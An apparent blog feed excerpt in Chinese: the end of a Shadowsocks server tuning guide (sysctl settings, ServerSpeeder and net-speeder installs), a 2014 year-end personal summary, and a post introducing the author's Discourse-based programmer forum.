class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_syncookies&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_tw_reuse&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_tw_recycle&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_fin_timeout&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_keepalive_time&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.ip_local_port_range&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;10000&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;65000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_max_syn_backlog&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;8192&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_max_tw_buckets&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_fastopen&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_rmem&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;87380&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;67108864&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_wmem&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;67108864&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_mtu_probing&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.ipv4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tcp_congestion_control&lt;/span&gt; = hybla&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改后执行 &lt;code&gt;sysctl -p&lt;/code&gt; 使配置生效&lt;/p&gt;
&lt;h3 id=&quot;3-2-锐速&quot;&gt;&lt;a href=&quot;#3-2-锐速&quot; class=&quot;headerlink&quot; title=&quot;3.2 锐速&quot;&gt;&lt;/a&gt;3.2 锐速&lt;/h3&gt;&lt;p&gt;锐速是一款非常不错的TCP底层加速软件，可以非常方便快速地完成服务器网络的优化，配合 ShadowSocks 效果奇佳。目前锐速官方也出了永久免费版本，适用带宽20M、3000加速连接，个人使用是足够了。如果需要，先要在锐速官网注册个账户。&lt;/p&gt;
&lt;p&gt;然后确定自己的内核是否在锐速的支持列表里，如果不在，请先更换内核，如果不确定，请使用 &lt;a href=&quot;http://my.serverspeeder.com/w.do?m=lslm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;手动安装&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;确定自己的内核版本在支持列表里，就可以使用以下命令快速安装了。&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget http:&lt;span class=&quot;comment&quot;&gt;//my.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar xzvf serverSpeederInstaller&lt;span class=&quot;selector-class&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bash serverSpeederInstaller.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入在官网注册的账号密码进行安装，参数设置直接回车默认即可，&lt;br&gt;最后两项输入 y 开机自动启动锐速，y 立刻启动锐速。之后可以通过&lt;code&gt;lsmod&lt;/code&gt;查看是否有appex模块在运行。&lt;/p&gt;
&lt;p&gt;到这里还没结束，我们还要修改锐速的3个参数，&lt;code&gt;vi /serverspeeder/etc/config&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;rsc&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; #RSC网卡驱动模式  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;advinacc&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; #流量方向加速  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;maxmode&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; #最大传输模式&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;digitalocean vps的网卡支持rsc和gso高级算法，所以可以开启&lt;code&gt;rsc=&amp;quot;1&amp;quot;&lt;/code&gt;，&lt;code&gt;gso=&amp;quot;1&amp;quot;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;重新启动锐速&lt;br&gt;&lt;figure class=&quot;highlight maxima&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;service serverSpeeder &lt;span class=&quot;built_in&quot;&gt;restart&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;3-3-net-speeder&quot;&gt;&lt;a href=&quot;#3-3-net-speeder&quot; class=&quot;headerlink&quot; title=&quot;3.3 net-speeder&quot;&gt;&lt;/a&gt;3.3 net-speeder&lt;/h3&gt;&lt;p&gt;net-speeder 原理非常简单粗暴，就是发包翻倍，这会占用大量的国际出口带宽，本质是损人利己，不建议使用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(1) Ubuntu/Debian 下安装依赖包&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; libnet1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-&lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; libpcap0&lt;span class=&quot;number&quot;&gt;.8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-&lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; libnet1-dev&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-&lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; libpcap0&lt;span class=&quot;number&quot;&gt;.8&lt;/span&gt;-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(2) Centos 下安装依赖包&lt;/strong&gt;&lt;br&gt;需要配置 epel 第三方源。下载 epel ：&lt;a href=&quot;http://dl.fedoraproject.org/pub/epel/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://dl.fedoraproject.org/pub/epel/&lt;/a&gt; 。例如，Centos 7 x64：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget http:&lt;span class=&quot;comment&quot;&gt;//dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-5.noarch.rpm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rpm -ivh epel-release-&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.noarch&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.rpm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum repolist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后安装依赖包：&lt;br&gt;&lt;figure class=&quot;highlight cmake&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; libnet libpcap libnet-devel libpcap-devel&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(3) 下载官方的 tar.gz 压缩包。解压安装运行：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight stata&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget http:&lt;span class=&quot;comment&quot;&gt;//net-speeder.googlecode.com/files/net_speeder-v0.1.tar.gz &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar zxvf net_speeder-v0.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;cd&lt;/span&gt; net_speeder&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chmod 777 *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt; build.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt; -DCOOKED&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先你需要知道你的网卡设备名，可以使用 ifconfig 查看。假设是eth0，那么运行方法是:&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./net_speeder eth0 &lt;span class=&quot;string&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;关闭 net-speeder&lt;br&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;killall&lt;/span&gt; net_speeder&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;哦，对了，作者已经将 net-speeder 迁移到 &lt;a href=&quot;https://github.com/snooda/net-speeder&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 了，感兴趣的可以关注、贡献。&lt;/p&gt;
&lt;p&gt;以上几种方法是我用过的几种比较有效的加速方法。有任何错误之处还请在下面留言指出。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;如果你不想折腾服务端安装和优化，你可以使用&lt;a href=&quot;http://cdcafe.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;虫洞咖啡厅&lt;/a&gt;提供的免费 shadowsocks 服务。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      最近国内的网络形式越来越严峻，在日益高筑的围墙之下，掌握一门穿墙之术越来越成为需要。相对于 VPN 而已， Shadowsocks 更为轻量级，安装配置过程极其简单。而客户端也可以在windows、mac、iOS和android上轻松运行，被人们所深深喜爱。下面说说 Shadowosocks 的安装和优化。
    
    </summary>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="shadowsocks" scheme="http://wuchong.me/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>2014年终总结</title>
    <link href="http://wuchong.me/blog/2014/12/31/2014-summary/"/>
    <id>http://wuchong.me/blog/2014/12/31/2014-summary/</id>
    <published>2014-12-31T11:47:08.000Z</published>
    <updated>2016-03-08T12:07:17.000Z</updated>
    
    <content type="html">&lt;p&gt;2014 年对于我们国家是不寻常的一年。这一年，共有六架飞机失事或失联，被称为「航空史上最黑暗一年」。这一年，中国进一步与众多境外服务失联。这一年数不清的互联网公司赴美上市，阿里巴巴成为美国历史上最大一笔 IPO。这一年快播倒下了、射手断舍离、人人影视被关闭、盒子被监禁。这一年，滴滴与快的、饿了么与美团让我们感受到了互联网的烧钱速度。这一年，东哥牵手奶茶妹妹，互联网更像娱乐圈。这一年火了互联网。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我这个人总是很懒，又觉得自己做事效率很快，其实是相反。年终总结也一样，很早的时候就开始计划，结果还是在最后一天才提笔。不写点东西又觉得对不起这一年，所以就翻开去年写的&lt;a href=&quot;http://wuchong.me/blog/2014/01/01/2013_summary/&quot;&gt;《2013年终总结》&lt;/a&gt;，结果让我想起「小道消息」发的这幅图，真是一图胜千言。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1ent20u41hcj20tc13mak2.jpg&quot; width=&quot;300px&quot;&gt;&lt;/p&gt;
&lt;p&gt;还是简单说说这一年来做了什么把。&lt;/p&gt;
&lt;h2 id=&quot;专业方向&quot;&gt;&lt;a href=&quot;#专业方向&quot; class=&quot;headerlink&quot; title=&quot;专业方向&quot;&gt;&lt;/a&gt;专业方向&lt;/h2&gt;&lt;p&gt;这一年最重要的任务是找工作吧。前半年基本是边找工作，边做课题和项目。后半年就开始做自己喜欢的，瞎忙活就到了现在。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;学了点Python，用Python写了些很好玩的东西。在阿里竞赛的第一季、第二季，Python也帮了我大忙。&lt;/li&gt;
&lt;li&gt;3月份开始将 Jacman 开源，并维护至今。已有 56 star，53 fork。&lt;/li&gt;
&lt;li&gt;参加了阿里巴巴大数据竞赛，历时四个多月，有幸走完了第二季并拿到个小奖，受邀去阿里总部学习的经历至今还印象深刻。&lt;a href=&quot;http://wuchong.me/blog/2014/07/30/ali-bigdata-competition-write-to-the-5-monthes/&quot;&gt;写了点记录&lt;/a&gt;留作纪念。&lt;/li&gt;
&lt;li&gt;做比赛同时，帮老师做了些web项目，用了些以后可能再也不会用到的技术。虽然生活过的宽裕了些，但是搭进去太多时间，后悔这些时间还不如用来做些有意义的开源项目。&lt;/li&gt;
&lt;li&gt;学习了 算法、Linux 、分布式架构、Java多线程、JVM 等知识。为校招做准备。&lt;a href=&quot;http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/&quot;&gt;如愿拿到期望 Offer&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;研究学习 Spark ，在 Mac 上搭了个环境，写了些代码。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;博客和码农圈&quot;&gt;&lt;a href=&quot;#博客和码农圈&quot; class=&quot;headerlink&quot; title=&quot;博客和码农圈&quot;&gt;&lt;/a&gt;博客和码农圈&lt;/h2&gt;&lt;p&gt;博客维护至今已经有一年了，在这一年里总共才写了 35 篇。开始写作后才明白，觉得那么简单的东西想简单地说出来是多么难。写作的产量不高，我一般一两个星期出产个一篇。在接下来一年，我还是会保持这个节奏，我不想使写作成为一种压力。&lt;/p&gt;
&lt;p&gt;根据 Google Analytics 的统计，总浏览量为 75,789 ，唯一用户数 19,450 。一年的曲线图： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1ent306ltx5j219m07l404.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;中间的一段高峰正式阿里竞赛期间发了几篇博文所致。后来就再也没超过那波峰，还得继续努力啊。&lt;/p&gt;
&lt;p&gt;一个月多前，我觉得架个论坛供程序员们交流讨论会很有意思，于是就弄了个码农圈。现在觉得做网站真的很不容易啊。把网站架起来真的只是开始的开始。&lt;/p&gt;
&lt;p&gt;虽然只运行了一个月，目前码农圈的访问量已经有 24,189，唯一用户数 1,720 ， 注册用户数 181 。码农圈还有很长的路要走，在这条路上有很多人在质疑，在冷眼旁观，但我坚信码农圈有他与众不同之处，我也相信码农圈明年这个时候还在，并且活地更好。&lt;/p&gt;
&lt;h2 id=&quot;那些书&quot;&gt;&lt;a href=&quot;#那些书&quot; class=&quot;headerlink&quot; title=&quot;那些书&quot;&gt;&lt;/a&gt;那些书&lt;/h2&gt;&lt;p&gt;今年读了很多技术书，不过很多都是为了面试而看。在这里就说写非技术书吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《浪潮之巅》 上下册&lt;/li&gt;
&lt;li&gt;《MacTalk 人生元编程》&lt;/li&gt;
&lt;li&gt;《三体》全三册&lt;/li&gt;
&lt;li&gt;《Rework》&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;读的有些少，为了读书还买了Kindle，里面还有不少好书，希望明年读多点。&lt;/p&gt;
&lt;h2 id=&quot;2015年&quot;&gt;&lt;a href=&quot;#2015年&quot; class=&quot;headerlink&quot; title=&quot;2015年&quot;&gt;&lt;/a&gt;2015年&lt;/h2&gt;&lt;p&gt;18 年的寒窗苦读，2015 年终于要走上工作岗位了。列了一些 TODO LIST ，等到 2016 年来回顾。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;维护发展码农圈，希望能建立一批稳定的用户群。&lt;/li&gt;
&lt;li&gt;读20本非技术书&lt;/li&gt;
&lt;li&gt;学习 Spark Docker 等技术。&lt;/li&gt;
&lt;li&gt;参与到开源项目中。&lt;/li&gt;
&lt;li&gt;与心爱的她有温馨的小家。&lt;/li&gt;
&lt;li&gt;与同事关系融洽，工作顺心。&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      2014 年对于我们国家是不寻常的一年。这一年，共有六架飞机失事或失联，被称为「航空史上最黑暗一年」。这一年，中国进一步与众多境外服务失联。这一年数不清的互联网公司赴美上市，阿里巴巴成为美国历史上最大一笔 IPO。这一年快播倒下了、射手断舍离、人人影视被关闭、盒子被监禁。这一年，滴滴与快的、饿了么与美团让我们感受到了互联网的烧钱速度。这一年，东哥牵手奶茶妹妹，互联网更像娱乐圈。这一年火了互联网。
    
    </summary>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>为什么要做「码农圈」？</title>
    <link href="http://wuchong.me/blog/2014/12/21/why-do-coderq/"/>
    <id>http://wuchong.me/blog/2014/12/21/why-do-coderq/</id>
    <published>2014-12-21T10:56:59.000Z</published>
    <updated>2016-03-08T12:20:23.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;a href=&quot;https://coderq.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/17/7dac137579f3f0b5.png&quot; class=&quot;img-logo&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;做一个面向程序员交流分享学习的社区吧！&lt;/p&gt;
&lt;p&gt;这个想法从一个月前的某个晚上就跳进了我的脑袋，之后好几个晚上因此兴奋地睡不着觉，呵呵。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现在已经有类似的网站啦，像 segmentfault , V2EX , OurCoders , 甚至知乎里的某些板块。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为什么还要有&lt;a href=&quot;https://coderq.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;「码农圈」&lt;/a&gt;呢？&lt;/p&gt;
&lt;p&gt;诚然，目前国内已经有很多耳熟能详的类似网站了，但是相信每一个细分的市场都有很大的空间。而我想做的自然有其独到的特点。首先，这是一个以交流分享为主的网站，不同于 segmentfault 专注于技术交流。在这里气氛可以更加活跃。&lt;/p&gt;
&lt;p&gt;程序员是一个很独特的群体，他们可以因为一些 which better 的问题而争论不休，他们都有非常类似的特征，勤劳而聪慧，更重要的是，他们正在改变世界！正是这个群体，他们不仅需要讨论技术，他们同样也要找女朋友、结婚买房、会有生活上的烦恼困惑，会想换工作、想移民、想创业等等。正是基于这一点，「码农圈」的想法逐渐开始在我的脑海里成形，而它并不完全同于现有网站。&lt;/p&gt;
&lt;p&gt;「码农圈」是一个以交流分享为主的网站，不同于 segmentfault 专注于技术问答类。「码农圈」是一个专注于程序员群体的社区，不同于 V2EX 的创意工作者们和知乎的广大群体们，在这里的信息会更加垂直更加社区化。「码农圈」是一个论坛形式的社区，这也不同于上面的问答形社区。最主要的是「码农圈」足够酷、足够方便、能适配各种端，这也是不同于北邮人这些传统论坛的方面。&lt;/p&gt;
&lt;p&gt;程序员可以在这里交流一切，包括技术、人生、梦想乃至情感。不同于专业技术社区的压抑，在这里气氛会更加活跃，在这里你会与广大程序员有更多的共鸣。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;为什么叫码农圈呢？&quot;&gt;&lt;a href=&quot;#为什么叫码农圈呢？&quot; class=&quot;headerlink&quot; title=&quot;为什么叫码农圈呢？&quot;&gt;&lt;/a&gt;为什么叫码农圈呢？&lt;/h2&gt;&lt;p&gt;码农在英文中的词可以对应为 coder，而程序员是 programmer。有趣的是，不管是国内国外人们对这两个词的看法是类似的。人们更愿意称自己是程序员，而不是码农。码农更早来源于IT民工，认为码农是一群收入低、没有技术、充当着代码搬运工的群体。但在我眼中的码农是任何 IT 技术人员必经的过程，他们心怀梦想，默默地在坑里打怪升级，一步步地成长为程序员、开发者、工程师、架构师、极客甚至是多隆一样的神。他们视技术为生命，不管职位多高都会自己动手写代码，坚持自由开放和平等。在这互联网颠覆世界的社会里，码农是一切IT技术创新的源泉，「码农圈」就是要聚集这样一群有改变自己、改变世界想法的 IT 人员，一起成长，一起搭建一个优质的技术人脉圈。&lt;/p&gt;
&lt;p&gt;有了这个想法后，我就开始寻找可行的技术方案。起初决定使用 PHP 的 Laravel 框架自己写一个论坛。虽然 Laravel 的开发速度很快，但要做出一个可用网站原型仍需很久。于是我考虑基于现有开源软件做二次开发。我注意到了 &lt;a href=&quot;https://github.com/summerblue/phphub&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PHPHUB&lt;/a&gt; ，一款国人做的基于 Laravel 4.2 的开源论坛，网站简洁类似 V2EX 。也注意到了 &lt;a href=&quot;http://www.wecenter.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WeCenter&lt;/a&gt; 这样的新型知识社区。但还是被 &lt;a href=&quot;http://www.discourse.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Discourse&lt;/a&gt; 震撼到了。是的，我被这款声称要做论坛届的「WordPress」的开源产品了迷住了。其新颖的产品思维深深的打动了我，不愧是出自 Stackoverflow 和 StackExchange 的联合创始人 Jeff Atwood 之手。&lt;/p&gt;
&lt;p&gt;于是开始了建站之旅，购买域名、主机、邮箱服务，搭建原型，上 SSL 、CDN。个人在其上又进行了大量修改，包括 UI 、功能添加、汉化等等。下面看看「码农圈」的特色功能吧。&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;强大的编辑器，交流更顺畅&quot;&gt;&lt;a href=&quot;#强大的编辑器，交流更顺畅&quot; class=&quot;headerlink&quot; title=&quot;强大的编辑器，交流更顺畅&quot;&gt;&lt;/a&gt;强大的编辑器，交流更顺畅&lt;/h3&gt;&lt;p&gt;回帖是一个论坛最为核心的功能，让用户在回帖过程中体验到方便和快感是很吸引人的。&lt;/p&gt;
&lt;p&gt;您可以直接粘贴/拖拽一张图片到编辑框中，就可以实现上传。&lt;/p&gt;
&lt;p&gt;在您阅读的时候，就开始写您的回复。在浏览主题的过程中修改您的回复并引用更多内容！您甚至可以在不同主题之间切换而无需打断编辑。&lt;/p&gt;
&lt;p&gt;我们会保存您阅读的进度——以及您的帖子的草稿——即使您最后用不同的设备发表了帖子也行。&lt;/p&gt;
&lt;p&gt;方便的Emoji 表情，能更丰富地表达你的想法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/42/3c67bee069ba7b5b.gif&quot; class=&quot;img-shadow&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;简洁，附带上下文&quot;&gt;&lt;a href=&quot;#简洁，附带上下文&quot; class=&quot;headerlink&quot; title=&quot;简洁，附带上下文&quot;&gt;&lt;/a&gt;简洁，附带上下文&lt;/h3&gt;&lt;p&gt;「码农圈」是一个简洁、扁平化的论坛，回复就像瀑布一样线性显示在页面中。回复可以展开，它们位于帖子的底部或顶部，以便您了解对话的完整上下文——而不用打断您的阅读。&lt;/p&gt;
&lt;p&gt;Discourse 是一个简洁、平面化的论坛，回复就像瀑布一样线性显示在页面中。回复可以展开，它们位于帖子的底部或顶部，以便您了解对话的完整上下文——而不用打断您的阅读。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/44/e2662b931cb749f9.gif&quot; class=&quot;img-shadow&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;交流，无需翻页&quot;&gt;&lt;a href=&quot;#交流，无需翻页&quot; class=&quot;headerlink&quot; title=&quot;交流，无需翻页&quot;&gt;&lt;/a&gt;交流，无需翻页&lt;/h3&gt;&lt;p&gt;为什么要把对话分割成尴尬麻烦、难以寻找的页面？何必不断地寻找下一页按钮？在这里你只要一直往下滚动屏幕即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://dn-coderq.qbox.me/uploads/default/47/36d75bd043a06c7e.gif&quot; class=&quot;img-shadow&quot;&gt;&lt;/p&gt;
